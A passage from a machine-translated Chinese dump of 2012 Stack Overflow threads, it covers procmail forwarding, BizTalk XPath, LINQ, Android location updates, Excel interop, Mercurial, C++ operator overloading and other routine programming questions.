    [UIView setAnimationDidStopSelector: @selector(animationDidStop:finished:context:)];
    //        loadingView.frame = CGRectMake(rect.origin.x, rect.origin.y - 80, rect.size.width, rect.size.height);
    [UIView commitAnimations];

}

[self.delegate touchUp];

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T20:26:25.950

在 touchesBegan 上，保存您开始的“附件项目”！？

# procmail - 如果来自某个地址，请勿转发

> ID：13360109
> 
> 赞同：1
> 
> 时间：2012-11-13T11:39:19.720
> 
> 标签：procmail

在更改标题后，我有一个 procmail 配方，用于存储电子邮件并转发它：

```
:0c
${DEFAULT}

:0fhw
| formail -i "From: changedemail@address.com"

:0
* !^From:.*\<donforward@domain\.com\>
{
 ! other@recipient.net    # That's exclamation mark, address to forward to
} 
```

现在我只想转发如果*不是*来自某个地址，但我无法让它工作，不知何故它似乎永远不匹配。

我需要添加什么才能使其正常工作，并且不要两次存储电子邮件（这也是尝试解决方案时发生的情况，我认为因为配方继续进入某种默认行为）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-14T08:11:20.900

操作周围的大括号是语法错误。

```
:0  # is the address spelled correctly?  not don_T_forward?
* !^From:.*\<donforward@domain\.com\>
! other@recipient.net 
```

（或者，替代但多余的，

```
:0
* !^From:.*\<donforward@domain\.com\>
{
 :0
 ! other@recipient.net
} 
```

另外，见下文。）

但是，这**永远不会真正匹配，**因为您更改了`From:`上一个配方中的地址。也许添加一些逻辑来保留原始的`From:`，或者毕竟将大括号中的动作组合起来：

```
:0c
${DEFAULT}

:0
* !^From:.*\<donforward@domain\.com\>
{
  :0fhw
  | formail -i "From: changedemail@address.com"
  :0
  ! other@recipient.net
} 
```

`$DEFAULT`是的，如果消息没有通过任何配方成功传递，默认操作是传递到。您可能希望反转`:0c`逻辑，以便将原件发送到您的常规收件箱（前提是您没有任何以后将其发送到其他地方的配方）并转发副本。

```
# Drop the $DEFAULT delivery from above
:0c
* !^From:.*\<donforward@domain\.com\>
{
  :0fhw
  | formail -i "From: changedemail@address.com"
  :0
  ! other@recipient.net
} 
```

对于故障排除，使用`VERBOSE=yes`. 在有问题的配方之前添加此指令，然后在消息到达时检查日志输出。有关（更多）信息，请参阅[http://porkmail.org/era/mail/procmail-debug.html](http://porkmail.org/era/mail/procmail-debug.html)

# xpath - BizTalk SendPort InboundBodyPathExpression XPath

> ID：13360110
> 
> 赞同：1
> 
> 时间：2012-11-13T11:39:21.577
> 
> 标签：xpath, biztalk, biztalk-2010

以下是我调用他们的网络服务后从第 3 方收到的真实消息：

```
<TransferRequest>
<SecurityHeader>
<...Removed, but not bothered by this/>
</SecurityHeader>
<TransferReq xmlns="'http://www.removedforthepostonstackoverflow">
..... 
```

在我的 BizTalk 映射中，我需要没有给定安全标头的信息（因此使用 TransferReq 作为根）-我尝试生成包含标头的 XSD，但我不能这样做-因为默认命名空间在根之下命名。

我已经尝试修改 BizTalk InboundBodyPathExpression，以便它使用 XPath 来查找我的相关节点以用作其根节点，根据此处的微软文档：[为 WCF 适配器指定消息正文](http://msdn.microsoft.com/en-us/library/bb226478.aspx)

这是我的 xpath：

```
/*[local-name()='TransferRequest']/*[local-name()='TransferReq' and namespace()='http://www.removedforthepostonstackoverflow'] 
```

以上是第三者返回的内容

然而，我得到了这个，被抛出：

> 端点处理程序通信异常。处理message时出错错误描述：System.InvalidOperationException: Inbound body path expression "/ *[local-name()='TransferRequest']/* [local-name()='TransferReq' and namespace()=' [http:// /www.removedforthepostonstackoverflow](http://www.removedforthepostonstackoverflow) ']" 无效。

有人可以看到我做错了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-15T23:54:38.347

**问题很明显**：

没有 XPath 函数`namespace()`——您需要使用标准的 XPath 函数：

`namespace-uri()`

# c# - 使用linq和c#查询数据表

> ID：13360113
> 
> 赞同：1
> 
> 时间：2012-11-13T11:39:38.267
> 
> 标签：c#, asp.net, linq, datatable

我查看了许多站点，但无法理解如何使用 linq 查询数据表的前几行。

如果数据来自 Excel 文件，我还想知道这方面的列引用是否相同？例如，数据表中的 F 列或编号参考中的列是否相同？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T11:40:42.773

```
DataTable yourDataTable = new DataTable();
var result = yourDataTable.AsEnumerable()
    .Take(2) // Select first two rows
    .Select(r =>
        new
        {
            Field1 = r.Field<int>("col1"), // Select your columns
            Field2 = r.Field<string>("col2")
            // your rest of the columns
        }
    ); 
```

如果您只想选择第二行，则：

```
var result = yourDataTable.AsEnumerable()
    .Skip(1) // skip first row
    .Take(1) // Select second row
    .Select(r =>
        new
        {
            Field1 = r.Field<int>("col1"), // Select your columns
            Field2 = r.Field<string>("col2")
            // your rest of the columns
        }
    ); 
```

**编辑：**

要选择所有列，而不是特定列，只需`Select`从语句中删除 。像这样的东西：

```
var result = yourDataTable.AsEnumerable()
    .Skip(1)  // skip first row
    .Take(1); // Select second row 
```

# iphone - 如何获取用户的设备令牌并将其作为 PDF 文件附加到电子邮件？

> ID：13360121
> 
> 赞同：0
> 
> 时间：2012-11-13T11:40:19.437
> 
> 标签：iphone, ios, xcode, sdk, email-attachments

我的应用程序有一个投票主题，为了避免作弊，我打算让用户通过电子邮件投票，其中包括他/她的设备令牌，这样我就可以查明用户是否多次投票。有什么方法可以获取用户的设备令牌并将其作为 PDF 文件附加到此电子邮件中？如果可以的话，谁能给我一个示例代码？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:41:36.800

首先，这似乎是一个非常糟糕的主意，发送电子邮件并附加文件......只是丑陋。最好在您的投票服务器上打开一个 URL，包括设备的 ID。

您可以获得设备的唯一 ID，例如

```
[[UIDevice currentDevice] identifierForVendor] 
```

或在 iOS 6 之前，您可以使用[OpenUDID](https://github.com/ylechelle/OpenUDID)。

然后使用[NSURLConnection](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSURLConnection_Class/Reference/Reference.html)进行投票。

# android - android locationlistener 在注销监听器后继续调用 onlocationChanged

> ID：13360123
> 
> 赞同：1
> 
> 时间：2012-11-13T11:40:32.720
> 
> 标签：android, gps, location

我有一个获取用户位置的应用程序。我已经在 oncreate() 中注册了 lo​​cationManager 和 listener。我分别在 onResume() 和 onPause() 中请求并删除了更新。应用程序找到位置并在 onLocationChanged 的​​ loc 对象上调用 getTime()，这是为了获取外部时间，然后再与系统时间进行比较。这个时间是在 applicationObject 中设置的，以便它在应用程序范围内可用。一切正常，我从 applicationObject 时间设置器方法向用户敬酒。

我发现，当我通过修复用户的位置来找到时间并转到下一个活动时，应用程序会继续获得另外 20 秒甚至更多的时间。

当我在第一个活动的 onPause() 方法中取消注册位置侦听器时，怎么会这样？

```
 @Override
        protected void onPause() {
            mlocManager.removeUpdates(mlocListener);
            super.onPause();
        }

    @Override
        protected void onResume() {

             mlocManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, mlocListener);
            super.onResume();
        }

         private class MyLocationListener implements LocationListener {

                @Override
                public void onLocationChanged(Location loc) {

                    Log.e(TAG, "external time = " + loc.getTime());
                    DateTime dt = new DateTime(loc.getTime());
                    DateTimeFormatter df3 = DateTimeFormat.forPattern("yyyy-MM-dd H:mm:ss.SSS");
                    String formattedNowTime3 = df3.print(dt);
                    Log.e(TAG, "formatted ext time = " + formattedNowTime3);
                    nfcscannerapplication.setExternalTime(dt);

                }

                @Override
                public void onProviderDisabled(String provider) {
                    // TODO Auto-generated method stub

                }

                @Override
                public void onProviderEnabled(String provider) {
                    // TODO Auto-generated method stub

                }

                @Override
                public void onStatusChanged(String provider, int status,
                        Bundle extras) {
                    // TODO Auto-generated method stub

                }

                }//end of MyLocationListener

@Override
    protected void onCreate(final Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.entryscreen);

        mlocManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        mlocListener = new MyLocationListener(); 
```

.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:35:32.427

`onPause()`只能在新活动开始后调用。

如果你只想要一个`onLocationChange()`，你可以使用`requestSingleUpdate()`，你的问题就消失了。

问候。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T11:50:01.117

在 removeUpdates() 之后将 mlocListener 设置为 null；

# filesystems - 用于嵌入式的强大文件系统

> ID：13360129
> 
> 赞同：2
> 
> 时间：2012-11-13T11:40:47.097
> 
> 标签：filesystems, embedded

我正在寻找嵌入式文件系统的实现，以将数据块存储在可按名称寻址的 nand 闪存中。目标处理器是运行 uC/OS-II 的 ColdFire v2，这就是 datalight.com 的巨大 FlashFX 不适合的原因。这种实现必须对偶尔的断电和错误的 nand 存储具有鲁棒性。谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:26:45.543

如果您还没有查看启用了日志功能的 uC/FS，那么我将从那里开始。

[http://micrium.com/page/products/rtos/fs](http://micrium.com/page/products/rtos/fs)

日志文件系统应该在系统故障期间保持 FS 的完整性。

[http://en.wikipedia.org/wiki/Journaling_file_system](http://en.wikipedia.org/wiki/Journaling_file_system)

# eclipse-pde - 如何在 tycho 构建中指定 P2 因果关系建议

> ID：13360134
> 
> 赞同：1
> 
> 时间：2012-11-13T11:41:23.710
> 
> 标签：eclipse-pde, p2, tycho

如果安装了主要功能，我希望考虑安装其他功能。似乎[P2 术语是因果关系建议](http://wiki.eclipse.org/Equinox_P2_Resolution#Causality "因果关系建议")。有谁知道如何为第谷构建制定这个建议？

# ruby-on-rails - 有没有办法提前安排 Heroku 维护模式？

> ID：13360135
> 
> 赞同：2
> 
> 时间：2012-11-13T11:41:27.383
> 
> 标签：ruby-on-rails, heroku, maintenance

我们有一个在 heroku 上运行的应用程序，我们需要在夜间将其置于维护模式一小时，同时亚马逊对我们正在使用的 RDS 实例执行维护。

有谁知道安排这个的好方法。

我可以在办公室的一台机器上创建一个 cron 作业来完成它，但这似乎有点不合时宜。

我宁愿从应用程序本身中执行此操作，可能使用延迟作业（我们已经在使用），或者从计划任务中执行。但是，我找不到任何有关从正在运行的应用程序中与 Heroku 管理系统交互的文档。我只是没有寻找正确的东西吗？

# php - 在没有 jUpgrade 的情况下将 Joomla 1.5.x 升级到 2.5.x

> ID：13360136
> 
> 赞同：0
> 
> 时间：2012-11-13T11:41:28.677
> 
> 标签：php, joomla

我将我们的网站从旧主机移到了新主机。我们现在遇到错误，我无法升级到 2.5，因为我无法访问该网站来安装 jUpgrade。

有没有办法在没有 jUpgrade 的情况下迁移到 2.5.x？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:08:48.183

SP 升级（[此处](http://extensions.joomla.org/extensions/migration-a-conversion/joomla-migration/15609)链接）是另一个类似于 jUpgrade 从 1.5.x 到 2.5.x 的设备（尽管是商业的）。

如果没有 jUpgrade 或 SPUpgrade，恐怕您要从头开始 - 安装 Joomla 2.5 的空白副本并手动安装所有旧组件等。

请记住，从 1.5.x 升级到 2.5.x 时，并非所有扩展都兼容！

# c# - Linq To XML - 使用 XDocument 并创建对象列表

> ID：13360143
> 
> 赞同：5
> 
> 时间：2012-11-13T11:42:02.727
> 
> 标签：c#, xml, linq

我必须阅读`XML`文档并将值插入到`List<T>`我的对象中。

## 班级（结果）

```
+Result
-username
-dob
-answer1
-answer2
-uuid 
```

## 下面是XML格式结构

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<export exportDate="2012-11-07T12:03:52.823+11:00">
    <survey type="USER" completion="2012-11-07T11:46:52.754+11:00" reference="2012-11-07T11:30:34.680+11:00" year="2012" uuid="226f2aa3-46e6-46ab-8995-7d52eb21d5f4">
        <user xsi:type="USER" created="2012-11-07T11:09:30.409+11:00" dob="08/06/1988" surname="Billy" name="Bob" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
        <subject created="2012-11-07T11:09:30.409+11:00" dob="08/06/1988" surname="Billy" name="Bob"/>
        <version released="1970-01-01T10:00:02.012+10:00" version="1"/>
        <result group="2" rawscore="2.4" metric="1"/>
        <result group="2" rawscore="2.0" metric="2"/>
        <answer score="1" question="6"/>
        <answer score="2" question="7"/>
    </survey>       
</export> 
```

## 我目前的进度

我以前像过去一样使用**XmlDocument**，但现在我使用 Linq，我确信这可以在几行内完成。我不喜欢下面代码的外观，如果有一些提示请帮忙。

谢谢你

```
 List<Result> results = new List<Result>();

    XmlDocument doc = new XmlDocument();
    doc.Load(filename); 

    XmlNodeList objects = doc.GetElementsByTagName("survey"); 
    foreach (XmlNode o in objects)
    {
        Result result = new Result();

        if (o.Attributes["type"].Value == "USER" || o.Attributes["type"].Value == "ADMIN")
        {
            result.surveycompleted = o.Attributes["completion"].Value;

            XmlNodeList usernodes = o.SelectNodes("user");
                ....
            if (usernodes.Count > 0)
            {}
            else
            { 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T11:52:52.633

使用 LINQ2XML：

```
XElement doc=XElement.Load(filename);
List<Result> lstSurvey=doc.DescendantsAndSelf("Survey").Select(x=>
new Result
{
    uuid=x.Element("Survey").Attribute("uuid").Value,
    username=x.Element("user").Attribute("name").Value,
    dob=x.Element("user").Attribute("dob").Value,
    answer1=x.Elements("answer").First().Value,
    answer2=x.Elements("answer").Skip(1).First().Value
}
).ToList<Result>(); 
```

# python - Celery 的异步替换

> ID：13360145
> 
> 赞同：4
> 
> 时间：2012-11-13T11:42:10.097
> 
> 标签：python, django, asynchronous, celery, gevent

我们在 Django 项目中使用 Celery 执行后台任务。不幸的是，我们在任务中有许多阻塞套接字，可以建立很长时间。所以 Celery 变得满载并且没有响应。

Gevent 可以帮助我处理套接字，但 Celery 仅对 gevent 提供实验性支持（正如我在实践中发现的那样，它不能很好地工作）。所以我考虑切换到另一个任务队列系统。

我可以选择两种不同的方式：

1.  编写自己的任务系统。这是最不受欢迎的选择，因为它需要很多时间。
2.  找到可以在猴子修补后工作的芹菜的良好且经过充分尝试的替代品。

有没有 Celery 的类似物，即使在突然退出后也能保证我执行任务？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:55:05.620

你试过用 Celery + eventlet 吗？它在我们的项目中运行良好

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T11:56:05.767

Zeromq 可能适合您的用例。

见 - [https://serverfault.com/questions/80679/how-to-pick-between-rabbitmq-and-zeromq-or-something-else](https://serverfault.com/questions/80679/how-to-pick-between-rabbitmq-and-zeromq-or-something-else)

但是，您需要编写自己的消息库来持久化消息。

# c# - asp.net mvc4 linkedin 集成 - 拒绝访问发布共享

> ID：13360148
> 
> 赞同：0
> 
> 时间：2012-11-13T11:42:19.200
> 
> 标签：c#, asp.net-mvc, oauth, linkedin

我正在为我的 asp.net mvc4 应用程序开发社交网络集成。

Twitter 和 Facebook 对我来说很容易，但我严重坚持使用 LinkedIn。

这是我的代码。

```
 public ActionResult LinkedInTest(string text)
    {
        var client = new RestClient
                         {
                             Authority = "https://api.linkedin.com/uas/oauth",
                             Credentials = LinkedInSocialHelper.GetCredentials()
                         };
        var request = new RestRequest {Path = "requestToken"};
        RestResponse response = client.Request(request);

        token = response.Content.Split('&')[0].Split('=')[1];
        tokenSecret = response.Content.Split('&')[1].Split('=')[1];
        textToPost = text;
        Response.Redirect("https://api.linkedin.com/uas/oauth/authorize?oauth_token=" + token + "&scope=r_basicprofile+r_emailaddress+r_network+r_contactinfo+rw_nus");
        return null;
        textToPost = text;
        return RedirectToAction("LinkedInCallback");
    }

    public ActionResult LinkedInCallback()
    {
        verifier = Request["oauth_verifier"];

        var client = new RestClient
                         {
                             Authority = "https://api.linkedin.com/uas/oauth",
                             Credentials = LinkedInSocialHelper.GetCredentials(token, tokenSecret, verifier),
                             Method = WebMethod.Post
                         };
        var request = new RestRequest {Path = "accessToken"};
        RestResponse response = client.Request(request);
        token = response.Content.Split('&')[0].Split('=')[1];
        tokenSecret = response.Content.Split('&')[1].Split('=')[1];
        LinkedInSocialHelper.Post(textToPost, token, tokenSecret);
        return RedirectToAction("Calendar");
    }
    public static void Post(string text, string accessToken, string accessTokenSecret)
    {
        var tokenManager = new TokenManager(ApiKey, ApiSecret);
        tokenManager.ExpireRequestTokenAndStoreNewAccessToken(null, null, accessToken, accessTokenSecret);
        var authorization = new WebOAuthAuthorization(tokenManager, UserToken);
        LinkedInService service = new LinkedInService(authorization);
        //var user = service.GetCurrentUser(ProfileType.Public); - IT IS GIVING ME THE SAME ERROR - Access denied
        service.CreateShare(text, VisibilityCode.ConnectionsOnly);
    } 
```

一切正常，除了最后一件事 - 发布共享 - 尽管我使用所有必要的权限生成令牌，但我可以访问发布共享被拒绝异常：

"https://api.linkedin.com/uas/oauth/authorize?oauth_token=" + token + "&scope=r_basicprofile+r_emailaddress+r_network+r_contactinfo+rw_nus"

希望各位好心人帮帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T12:59:44.627

请参阅此处的最后一篇文章 - 它描述了如何解决它

[https://developer.linkedin.com/forum/permission-scope-request-token-query-not-working?page=1](https://developer.linkedin.com/forum/permission-scope-request-token-query-not-working?page=1)

# php - 在 PHP 透视图中看不到作为脚本运行/作为网页运行选项

> ID：13360150
> 
> 赞同：2
> 
> 时间：2012-11-13T11:42:33.253
> 
> 标签：php, eclipse, eclipse-pdt, eclipse-juno

我正在使用带有 PDT 版本 3.1.1.201209241501 的 Eclipse Juno。我正在尝试调试我的 PHP 网页，但我没有看到调试为或运行为 - PHP 网页*或*调试为或运行为 PhP 脚本的选项。我正在使用 PhP 5.3.18

有人能帮助我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T22:12:27.057

当您单击调试配置时，您应该能够选择 PHP CLI 应用程序或 PHP Web 应用程序。

如果你看不到它，它看起来 PDT 没有正确安装，我的 PDT 显示版本 - PHP Development Tools (PDT) SDK Feature 3.1.1.201209101312
并且应该是 Windows 的最新版本。

您是否在 Preferences->PHP->PHP executables 中配置了 PHP 可执行文件？

# c# - 需要一个解决方案来从 C# 中的 Excel 中检索数据而没有 HRESULT:0x800A03EC 异常

> ID：13360153
> 
> 赞同：-1
> 
> 时间：2012-11-13T11:42:42.517
> 
> 标签：c#, .net, excel, com-interop

我需要从 Excel 文件中检索数据并将数据插入数据库。我现在尝试检索数据，但我不断收到 HRESULT:0x800A03EC 异常错误。

我的代码：

```
 public void ReadFile()
        {
            try
            {
                Excel.Application ep = new Excel.Application();
                Excel.Workbook ewb = ep.Workbooks.Open(@"C:/Temp/Copy of AGCO Transport Schedule.xlsx");
                Excel.Worksheet ews = ewb.Sheets[1];
                Excel.Range range = ews.UsedRange;

                int rowCount = range.Rows.Count;
                int columnCount = range.Columns.Count;

                for (int i = 1; i < rowCount; i++)
                {
                    for (int j = 1; j < columnCount; j++)
                    {
                      string  str = (string)(range.Cells[i, j] as Excel.Range).Value2;
                        Console.WriteLine(str);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("YOLO "+e.Message);
            }
        }
    } 
```

在从此处的用户那里获得上述代码的解决方案后。循环索引应更改为 1 而不是 0。我已经更正了上面的代码。但问题是我只需要从 Excel 中的数据中选择 2 列，所以我继续使用 sql 从 Excel 文件中检索数据。但是这次我不断收到“无法创建文件”错误，当我尝试打开我的连接时会发生这种情况。

我的代码：

```
public void ReadExcelFile()
{
    string connectionString = string.Format(ConfigurationManager.ConnectionStrings["ExcelConnection"].ConnectionString.Replace("'", "\""), "@C:/Temp/Copy.xlsx");
    using (OleDbConnection connection = new OleDbConnection(connectionString))
    {
        try
        {
            connection.Open();
            string sqlCmd = "SELECT  * FROM [Ark1$]";
            using (OleDbCommand command = new OleDbCommand(sqlCmd, connection))
            {
                command.CommandType = System.Data.CommandType.Text;
                using (OleDbDataReader reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        Console.WriteLine(reader.ToString());
                    }
                }
            }

        }
        catch (Exception exception)
        {
            Console.WriteLine("ERROR in ReadExcelFile() method. Error Message : " + exception.Message);
        }
    }
} 
```

谁能帮我这个 ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T11:48:28.920

尝试在两个 for 循环上从 1 开始循环计数。excel 文件的索引从 1 开始。我想我不是从零开始的索引。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-13T11:58:47.587

我想补充一点：你的方法很慢 - 真的，真的很慢。为了加快速度，您有两种选择：使用 EPPLUS，它是一个快速且免费的 Excel 阅读/写作库。Oder 一口气从 excel 中获取数据，只需将范围对象中的数据“拉”到一个数组中（VB.net 中的 dim values() = range.value2）并遍历该数组。这比枚举每个单元格要快得多。

# mercurial - 推送时有没有办法跳过提交

> ID：13360156
> 
> 赞同：0
> 
> 时间：2012-11-13T11:43:02.333
> 
> 标签：mercurial

我在本地提交了一个探索性和错误的变更集。该错误已在下一次本地提交中修复。现在我想推送已调试的版本，但以跳过错误的本地提交的方式。有没有办法简单地做到这一点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T13:08:25.997

简短的回答：没有。

长答案：您可以将最近的提交链排除在推送之外，但在推送时您不能错过链的某些部分。这是因为 mercurial 跟踪您在提交时所做的更改，并且您最近的更改集可能在错误的上下文之外没有意义。

选项：

1.  有些人会建议在将来使用[MQ 扩展](http://mercurial.selenic.com/wiki/MqExtension)来避免这个问题。
2.  有些人会建议使用[MQ 扩展](http://mercurial.selenic.com/wiki/MqExtension)来剥离这两个变更集，然后只重新提交固定版本。这可能会造成麻烦，尤其是如果您已经与任何人共享了您的变更集。
3.  有些人（包括我）会建议将您的存储库保持原样并推送两个变更集。如果您不修复它，那么在有缺陷的变更集中只会感到羞耻。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T13:59:32.637

4 一些人（包括我）会推荐使用 MQ 扩展在推送之前将两个连续的变更集折叠成一个

5 有些人会建议使用 histedit 或折叠扩展在推送之前将两个连续的变更集折叠成一个

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T14:04:05.080

你可以试试这个：

*   将您想要通过的提交导出为补丁
*   在新目录中重新克隆您的存储库
*   应用补丁
*   现在对您的共享存储库执行单次提交

# javascript - 使用javascript从div中的pdf对象中提取并添加链接？

> ID：13360160
> 
> 赞同：0
> 
> 时间：2012-11-13T11:43:17.950
> 
> 标签：javascript, css, pdf, object

我在网页中嵌入了一堆 PDF，我想为每个 PDF 添加或附加一个下载链接。例如：

```
<div>
  <object data="files/schedule.pdf" width="99%" height="800"></object>
<div class="link">
  Download Link: <a href="files/schedule.pdf">schedule.pdf</a>
</div> 
```

这样 PDF 将加载到页面中，但如果出于某种原因用户禁用了插件或插件，仍然会有一个链接，他们可以在其中下载文档。

有没有办法用前面的链接以编程方式填充“链接”类 div？

（PDF显示）

"下载链接：<a href="+文件路径+">+文件名+</a>"

以另一种方式去做会更好吗？如中，是否对链接进行了硬编码，然后使用文件路径填充对象数据？基本上，我希望不必为每个对象放置两次文件路径。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:20:27.407

此代码识别`<object>`页面上的所有标签，从属性中检索 uri，并在对象标签后立即`data=`创建一个下载链接。`<div>`看到这个[jsFiddle](http://jsfiddle.net/tppiotrowski/sUrD5/)。（需要 jQuery 库）

```
$(function(e) {
    var filename_re = /[^\/]+\.pdf$/;
    $('object').each(function(index) {
        var uri = $(this).attr('data');
        var filename = filename_re.exec(uri);
        $(this).after('<div class="link">Download Link: <a href="'+uri+'">'+filename+'</a></div>');
    }); 
}); 
```

纯 Javascript 版本（不需要 jQuery）。见[jsFiddle](http://jsfiddle.net/tppiotrowski/5Mhyy/)：

```
var filename_re = /[^\/]+\.pdf$/;
var obj = document.getElementsByTagName('object');
for (var i = 0, len = obj.length; i < len; i++) {
    var uri = obj[i].data;
    var filename = filename_re.exec(uri);
    var div = document.createElement('DIV');
    div.innerHTML = 'Download Link: <a href="'+uri+'">'+filename+'</a>';
    obj[i].parentNode.insertBefore(div, obj[i].nextSibling);
}​ 
```

# javascript - 在突出显示的文本附近显示 div（模态）

> ID：13360162
> 
> 赞同：1
> 
> 时间：2012-11-13T11:43:27.587
> 
> 标签：javascript, text, popup, selected

我想在页面中显示靠近选定（突出显示）文本的 div（模态）。我得到了选定的文本位置（开始和结束位置），但现在，我不知道如何将模态 div 定位在突出显示的文本的中心。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:16:37.683

尝试绝对定位。

> $(modal).css('位置','绝对')

以同样的方式，您可以将属性 top 和 left 设置为您需要的任何数字。这会将模态放置在您需要的任何位置。

# java - 枚举静态数组和注解值混淆

> ID：13360164
> 
> 赞同：3
> 
> 时间：2012-11-13T11:43:33.310
> 
> 标签：java, enums, annotations, netbeans-7

我有枚举：

```
public enum Scope {
    USER, GLOBAL;

    public static final Scope[] TRANSIENT = {};
    public static final Scope[] USER_OVER_GLOBAL = {GLOBAL, USER};
    public static final Scope[] GLOBAL_OVER_USER = {USER, GLOBAL};
} 
```

和注释：

```
public @interface Config {
    public Scope[] load() default Scope.GLOBAL_OVER_USER; // Can't use this defval

    public Scope[] save() default Scope.USER;
} 
```

为什么我不能使用静态数组作为注解属性的默认值？我的 NetBeans 7.3 Beta 告诉我需要`Scope`但已找到`Scope[]`- 正如您所看到的那样，这不是真的。是否存在与 NB 或 Java 7 相关的混淆？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T11:55:29.327

问题是，`Scope[] GLOBAL_OVER_USER`并非都是恒定的。（是的，数组本身是恒定的，但是您可以更改它的内容，例如`GLOBAL_OVER_USER[0] = GLOBAL;`.

一种解决方法是直接在注解声明中启动数组：

```
public Scope[] load() default {USER, GLOBAL}; 
```

# spring - 如何在 jpa 和 neo4j 中使用 jotm

> ID：13360166
> 
> 赞同：0
> 
> 时间：2012-11-13T11:43:44.190
> 
> 标签：spring, jpa, neo4j

我基于 spring、jpa 和 neo4j 配置了我的应用程序，以使用 JOTM 进行事务管理，配置如下。

```
<context:annotation-config />
<bean id="jotm" class="org.springframework.data.neo4j.transaction.JotmFactoryBean"/>
 <bean id="transactionManager" class="org.springframework.transaction.jta.JtaTransactionManager"> 
```

```
<bean id="graphDatabaseService" class="org.neo4j.kernel.EmbeddedGraphDatabase"
    destroy-method="shutdown" scope="singleton">
    <constructor-arg index="0" value="${neo4j.dblocation}" />
    <constructor-arg index="1">
        <map>
            <entry key="TXMANAGER_IMPLEMENTATION" value="spring-jta" />
        </map>
    </constructor-arg>
</bean> 

<neo4j:config graphDatabaseService="graphDatabaseService" /> 
<tx:annotation-driven mode="aspectj"  transaction-manager="transactionManager" /> 
```

但我面临着 org.springframework.transaction.jta.JtaTransactionManager 类的两个实例：jtaTransactionManager、neo4jTransactionManager。

我的日志：

使用 JTA UserTransaction：org.objectweb.jotm.Current@81e88 使用 JTA TransactionManager：org.objectweb.jotm.Current@81e88 使用 JTA UserTransaction：org.neo4j.kernel.impl.transaction.UserTransactionImpl@6cc760 使用 JTA TransactionManager：org.neo4j .kernel.impl.transaction.SpringTransactionManager@195ab57

我的配置是否正确，应该使用哪一个？

谢谢

# c++ - 用于矩阵的 C++ 重载运算符+

> ID：13360171
> 
> 赞同：2
> 
> 时间：2012-11-13T11:43:59.523
> 
> 标签：c++, operator-overloading

```
class matrix
{
    int n;
    double **a;  //the "matrix"
public:
    matrix(int);
    ~matrix();
    int getN();
    matrix& operator=(matrix&);
    double& operator()(int,int);
    friend matrix& operator+(matrix,matrix);
    friend matrix& operator-(matrix,matrix);
    friend matrix& operator*(matrix,matrix);
    friend ostream& operator<<(ostream &,const matrix &);
};

matrix& operator+(matrix A,matrix B)
{
    int i,j,n=A.getN();
    assert(A.getN()==B.getN());
    matrix *C=new matrix(A.getN());
    for(i=0; i<n; i++)
    {
        for(j=0; j<n; j++)
        {
            (*C)(i,j)=A(i,j)+B(i,j);
        }
    }
    return *C;
} 
```

这是重载算术运算符的正确方法吗？

我的代码中是否存在内存泄漏？

构造函数在堆中分配内存，首先为一个**双**指针数组，然后为每个指针分配一个**双**精度数组。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-13T11:47:19.763

您应该按值返回新矩阵，并通过 const 引用传递（至少一个）参数：

```
matrix operator+(const matrix& A, const matrix& B); 
```

这意味着您不应该在操作符的主体内动态分配它。

如果只调用公共成员方法或成员运算符，则无需将非成员运算符声明为`friend`.

`+=`另请注意，将 等作为成员运算符实现是常见的做法`*=`，然后根据这些实现非成员：

```
matrix operator+(matrix A, const matrix& B)
{
  return A+=B;
} 
```

顺便说一句，您必须检查矩阵的尺寸是否正确。对于您的设计，只能在运行时执行此操作。另一种方法是在编译时通过制作矩阵类模板来强制维度正确性：

```
template <typename T, size_t ROWS, size_t COLS> matrix; 
```

权衡是不同维度的矩阵是不同的类型。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T11:55:56.547

这种设计很快就会变得低效。想想当你这样做时会发生什么：

```
matrix D = A + B + C ; 
```

模板元编程为您提供了一些非常好的可能性来避免制作无用的临时文件。[犰狳](http://arma.sourceforge.net/)是这个想法的一个很好的实现。

# c#-4.0 - Parallel.ForEach 产生不准确的输出

> ID：13360179
> 
> 赞同：1
> 
> 时间：2012-11-13T11:44:30.720
> 
> 标签：c#-4.0, parallel-processing

我有一个场景，我必须运行嵌套的 foreach 来创建一个列表。我所做的伪代码如下

```
foreach(var x in list)           (ForEach1)
   get m // List<string>
   foreach(var k in m)           (ForEach2)
     get t // List<string>
        foreach(var o in t)      (ForEach3)
          // Do some work. and add output to a list
          // which is defined before first for each 
```

但是，因为我在 Foreach2 和 Foreach3 中从外部系统（通过运行 Perforce 命令从 Perforce）检索数据，所以这段代码运行速度非常慢，我确实需要加快速度。

